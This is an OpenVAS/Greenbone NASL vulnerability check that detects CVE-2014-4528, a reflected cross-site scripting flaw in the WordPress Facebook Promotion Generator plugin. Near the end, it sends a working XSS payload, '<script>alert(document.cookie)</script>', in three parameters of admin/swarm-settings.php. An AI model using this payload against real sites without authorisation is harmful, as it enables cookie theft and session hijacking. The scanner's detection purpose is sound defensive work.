# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804806");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2014-4528");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2014-08-11 13:11:45 +0530 (Mon, 11 Aug 2014)");
  script_name("WordPress Facebook Promotion Generator Plugin Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"WordPress Facebook Promotion Generator Plugin is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'promo_type', 'fb_edit_action', and 'promo_id' parameters
to admin/swarm-settings.php script is not properly sanitised before returning
to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
code in a user's browser session within the trust relationship between their
browser and the server.");
  script_tag(name:"affected", value:"WordPress Facebook Promotion Generator Plugin version 1.3.4 and prior.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/94372");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/68326");
  script_xref(name:"URL", value:"http://codevigilant.com/disclosure/wp-plugin-fbpromotions-a3-cross-site-scripting-xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/fbpromotions/admin/swarm-settings.php?" +
            'promo_type="><script>alert(document.cookie)</script>&fb_edit_action=' +
            "'><script>alert(document.cookie)</script>&promo_id='><script>alert(" +
            "document.cookie)</script>" ;

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document\.cookie\)</script>",
   extra_check:"SETTINGS<"))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
